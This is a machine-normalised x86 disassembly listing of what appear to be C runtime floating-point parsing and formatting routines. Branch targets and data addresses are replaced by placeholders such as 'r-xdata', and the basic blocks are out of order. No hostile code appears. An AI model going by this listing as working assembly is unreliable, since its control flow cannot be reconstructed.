and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10025243
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1002590b ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1002669c
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_1002593b
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_100178e5
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10010a44
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_100178e5
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
